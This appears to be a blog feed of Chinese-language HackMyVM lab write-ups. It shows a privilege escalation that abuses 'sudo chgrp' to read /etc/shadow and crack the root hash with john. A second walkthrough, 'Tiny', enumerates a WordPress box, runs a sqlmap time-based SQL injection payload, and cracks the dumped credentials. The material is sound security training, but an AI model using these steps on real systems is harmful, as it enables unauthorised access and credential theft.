  or:  <span class="token function">chgrp</span> <span class="token punctuation">[</span>OPTION<span class="token punctuation">]</span><span class="token punctuation">..</span>. <span class="token parameter variable">--reference</span><span class="token operator">=</span>RFILE FILE<span class="token punctuation">..</span>.
Change the group of each FILE to GROUP.
With --reference, change the group of each FILE to that of RFILE.</code></pre>
<p>chgrp可以改变一个用文件的组<br>想直接看root flag，发现失败,说明这个sophie这个组没有读这个目录的权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">sophie@debian:~$ <span class="token function">sudo</span> <span class="token function">chgrp</span> sophie  /root/root.txt
sophie@debian:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /root/root.txt
ls: cannot access <span class="token string">'/root/root.txt'</span><span class="token builtin class-name">:</span> Permission denied</code></pre>
<p>发现可以改shadow文件的组</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">sophie@debian:~$ <span class="token function">sudo</span> <span class="token function">chgrp</span> sophie  /etc/shadow 
sophie@debian:~$ <span class="token function">cat</span> /etc/shadow
root:<span class="token variable">$1</span><span class="token variable">$root</span><span class="token variable">$dZ6JC474uVpAeG8g0oh</span>/7.:18917:0:99999:7:::
daemon:*:18916:0:99999:7:::
bin:*:18916:0:99999:7:::
sys:*:18916:0:99999:7:::
sync:*:18916:0:99999:7:::
games:*:18916:0:99999:7:::
man:*:18916:0:99999:7:::
lp:*:18916:0:99999:7:::
mail:*:18916:0:99999:7:::
news:*:18916:0:99999:7:::
uucp:*:18916:0:99999:7:::
proxy:*:18916:0:99999:7:::
www-data:*:18916:0:99999:7:::
backup:*:18916:0:99999:7:::
list:*:18916:0:99999:7:::
irc:*:18916:0:99999:7:::
gnats:*:18916:0:99999:7:::
nobody:*:18916:0:99999:7:::
_apt:*:18916:0:99999:7:::
systemd-timesync:*:18916:0:99999:7:::
systemd-network:*:18916:0:99999:7:::
systemd-resolve:*:18916:0:99999:7:::
messagebus:*:18916:0:99999:7:::
sshd:*:18916:0:99999:7:::
systemd-coredump:<span class="token operator">!</span>*:18916::::::
mysql:<span class="token operator">!</span>:18917:0:99999:7:::
sophie:<span class="token variable">$y</span><span class="token variable">$j9T</span><span class="token variable">$mD6gcz0</span>.6rC4ZwGpDem3o0<span class="token variable">$HzDd6YXLy3Dsht17WVVX7v7ReGcJ9PXhG</span>/B3bx4Nz/C:18917:0:99999:7:::</code></pre>
<p>john一下root的密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> john aa <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt        
Warning: detected <span class="token builtin class-name">hash</span> <span class="token builtin class-name">type</span> <span class="token string">"md5crypt"</span>, but the string is also recognized as <span class="token string">"md5crypt-long"</span>
Use the <span class="token string">"--format=md5crypt-long"</span> option to force loading these as that <span class="token builtin class-name">type</span> instead
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>md5crypt, crypt<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token variable">$1</span>$ <span class="token punctuation">(</span>and variants<span class="token punctuation">)</span> <span class="token punctuation">[</span>MD5 <span class="token number">256</span>/256 AVX2 8x3<span class="token punctuation">]</span><span class="token punctuation">)</span>
Warning: invalid UTF-8 seen reading ~/.john/john.pot
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
barbarita        <span class="token punctuation">(</span>root<span class="token punctuation">)</span>     
1g <span class="token number">0</span>:00:00:00 DONE <span class="token punctuation">(</span><span class="token number">2024</span>-07-22 <span class="token number">16</span>:08<span class="token punctuation">)</span> <span class="token number">4</span>.000g/s 113856p/s 113856c/s 113856C/s bayot<span class="token punctuation">..</span>adelia
Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
Session completed. </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">sophie@debian:~$ <span class="token function">su</span>
Password: 
root@debian:/home/sophie<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>ssh</tag>
        <tag>chgrp</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Tiny</title>
    <url>/posts/3ca28c17/</url>
    <content><![CDATA[<p><strong>难度:Hard</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.157</strong></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.157 -sV -A </span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-21 <span class="token number">11</span>:04 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.157
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00062s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE    VERSION
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>        OpenSSH <span class="token number">9</span>.2p1 Debian <span class="token number">2</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp   <span class="token function">open</span>  http       Apache httpd <span class="token number">2.4</span>.57 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: Blog
<span class="token operator">|</span>_http-generator: WordPress <span class="token number">6.3</span>.1
<span class="token operator">|</span>_http-server-header: Apache/2.4.57 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
<span class="token operator">|</span> http-robots.txt: <span class="token number">15</span> disallowed entries 
<span class="token operator">|</span> /wp-admin/ /cgi-bin/ /private/ /temp/ /backup/ /old/ 
<span class="token operator">|</span> /test/ /dev/ / /misc/ /downloads/ /doc/ /documents/ 
<span class="token operator">|</span>_/restricted/ /confidential/
<span class="token number">8888</span>/tcp <span class="token function">open</span>  http-proxy tinyproxy <span class="token number">1.11</span>.1
<span class="token operator">|</span>_http-title: <span class="token number">403</span> Access denied
<span class="token operator">|</span>_http-server-header: tinyproxy/1.11.1
MAC Address: 08:00:27:DF:80:54 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.62</span> ms <span class="token number">192.168</span>.56.157

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">9.11</span> seconds</code></pre>
<p>开放了22 80 8888三个端口</p>
<h2 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h2><p><img src="https://ooo.0x0.ooo/2024/04/21/OpksIC.png" alt="OpksIC.png" loading="lazy"><br>看一下源码<br><img src="https://ooo.0x0.ooo/2024/04/21/OpkYhL.png" alt="OpkYhL.png" loading="lazy"><br>拿到一个域名tiny.hmv添加到hosts</p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># gobuster dir -u http://tiny.hmv -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>


<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://tiny.hmv
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">273</span><span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">273</span><span class="token punctuation">]</span>
/index.php            <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://tiny.hmv/<span class="token punctuation">]</span>
/wp-content           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">309</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://tiny.hmv/wp-content/<span class="token punctuation">]</span>
/wp-login.php         <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">5708</span><span class="token punctuation">]</span>
/license.txt          <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">19915</span><span class="token punctuation">]</span>
/wp-includes          <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">310</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://tiny.hmv/wp-includes/<span class="token punctuation">]</span>
/javascript           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">309</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://tiny.hmv/javascript/<span class="token punctuation">]</span>
/readme.html          <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">7399</span><span class="token punctuation">]</span>
/robots.txt           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">815</span><span class="token punctuation">]</span>
/wp-trackback.php     <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">135</span><span class="token punctuation">]</span>
/wp-admin             <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">307</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://tiny.hmv/wp-admin/<span class="token punctuation">]</span>
/xmlrpc.php           <span class="token punctuation">(</span>Status: <span class="token number">405</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">42</span><span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">273</span><span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">273</span><span class="token punctuation">]</span>
/wp-signup.php        <span class="token punctuation">(</span>Status: <span class="token number">302</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://tiny.hmv/wp-login.php?action<span class="token operator">=</span>register<span class="token punctuation">]</span>
/server-status        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">273</span><span class="token punctuation">]</span>
Progress: <span class="token number">1323360</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># robots.txt for http://tiny.hmv</span>

<span class="token comment"># General settings</span>
User-agent: *
Crawl-delay: <span class="token number">10</span>

<span class="token comment"># Standard subdirectory disallow</span>
Disallow: /wp-admin/
Disallow: /cgi-bin/
Disallow: /private/
Disallow: /temp/
Disallow: /backup/

<span class="token comment"># Specific rules for known bots</span>
User-agent: Googlebot
Allow: /

User-agent: Bingbot
Allow: /
Disallow: /private/

<span class="token comment"># Additional sitemap references</span>
Sitemap: http://tiny.hmv/sitemap.xml
Sitemap: http://wish.tiny.hmv/sitemap.xml

<span class="token comment"># Restrictions for other directories</span>
Disallow: /old/
Disallow: /test/
Disallow: /dev/

<span class="token comment"># Restrict access for BadBot</span>
User-agent: BadBot
Disallow: /

<span class="token comment"># Miscellaneous</span>
Disallow: /misc/
Disallow: /downloads/
Disallow: /doc/
Disallow: /documents/

<span class="token comment"># For any other miscellaneous user-agents, apply general restrictions</span>
User-agent: *
Disallow: /restricted/
Disallow: /confidential/</code></pre>
<p>又出现个子域 wish.tiny.hmv，也添加到hosts<br><img src="https://ooo.0x0.ooo/2024/04/21/Opkfti.png" alt="Opkfti.png" loading="lazy"><br>进入是一个登录界面</p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>随便输入账号密码抓个请求包放sqlmap跑一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># sqlmap -l sql.txt --batch --dbs                     </span>
        ___
       __H__                                                                                                                                 
 ___ ___<span class="token punctuation">[</span>.<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.8</span>.2<span class="token comment">#stable&#125;                                                                                                     </span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span>.<span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |                                                                                                                    
|___|_  [(]_|_|_|__,|  _|                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ <span class="token number">11</span>:29:37 /2024-04-21/

<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> sqlmap parsed <span class="token number">1</span> <span class="token punctuation">(</span>parameter unique<span class="token punctuation">)</span> requests from the targets list ready to be tested
<span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> URL:
GET http://wish.tiny.hmv:80/index.php
POST data: <span class="token assign-left variable">username</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">wish</span><span class="token operator">=</span><span class="token number">123456</span>%0D%0A
<span class="token keyword">do</span> you want to <span class="token builtin class-name">test</span> this URL? <span class="token punctuation">[</span>Y/n/q<span class="token punctuation">]</span>
<span class="token operator">></span> Y
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing URL <span class="token string">'http://wish.tiny.hmv:80/index.php'</span>
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resuming back-end DBMS <span class="token string">'mysql'</span> 
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> using <span class="token string">'/root/.local/share/sqlmap/output/results-04212024_1129am.csv'</span> as the CSV results <span class="token function">file</span> <span class="token keyword">in</span> multiple targets mode
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL
sqlmap resumed the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> from stored session:
---
Parameter: username <span class="token punctuation">(</span>POST<span class="token punctuation">)</span>
    Type: time-based blind
    Title: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
    Payload: <span class="token assign-left variable">username</span><span class="token operator">=</span>admin<span class="token string">' AND (SELECT 7400 FROM (SELECT(SLEEP(5)))mKnG) AND '</span>CLyv<span class="token string">'='</span>CLyv<span class="token operator">&amp;</span><span class="token assign-left variable">wish</span><span class="token operator">=</span><span class="token number">123456</span>
---
<span class="token keyword">do</span> you want to exploit this SQL injection? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache <span class="token number">2.4</span>.57
back-end DBMS: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 <span class="token punctuation">(</span>MariaDB fork<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching database names
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching number of databases
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resumed: <span class="token number">2</span>
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resumed: information_schema
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resumed: wish_db
available databases <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>:
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> information_schema
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> wish_db

<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> you can <span class="token function">find</span> results of scanning <span class="token keyword">in</span> multiple targets mode inside the CSV <span class="token function">file</span> <span class="token string">'/root/.local/share/sqlmap/output/results-04212024_1129am.csv'</span>                                                                                                                            

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">11</span>:29:37 /2024-04-21/
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.</code></pre>
<p>最后爆破出来一组账号密码</p>
<blockquote>
<p>+—-+———————————-+———-+<br>| id | password                         | username |<br>+—-+———————————-+———-+<br>| 1  | 8df4387dd1598d4dcf237f9443028cec | umeko    |<br>+—-+———————————-+———-+</p>
</blockquote>
<p>md5碰撞一下<br><img src="https://ooo.0x0.ooo/2024/04/21/OpkljX.png" alt="OpkljX.png" loading="lazy"></p>
<p><code>umeko/fuckit!</code></p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p><img src="https://ooo.0x0.ooo/2024/04/21/OpkjWt.png" alt="OpkjWt.png" loading="lazy"><br>成功登录</p>
<p>一般wp大概率是插件漏洞，先扫一下插件<br>fuzz一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ffuf -c -w wpplugins.txt -u 'http://tiny.hmv/wp-content/plugins/FUZZ'       </span>

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://tiny.hmv/wp-content/plugins/FUZZ
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /root/Desktop/wpplugins.txt
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">40</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
________________________________________________

akismet                 <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">325</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 8ms<span class="token punctuation">]</span>
thesis-openhook         <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">333</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 9ms<span class="token punctuation">]</span>
:: Progress: <span class="token punctuation">[</span><span class="token number">51545</span>/51545<span class="token punctuation">]</span> :: Job <span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> :: <span class="token number">4081</span> req/sec :: Duration: <span class="token punctuation">[</span><span class="token number">0</span>:00:12<span class="token punctuation">]</span> :: Errors: <span class="token number">0</span> ::</code></pre>
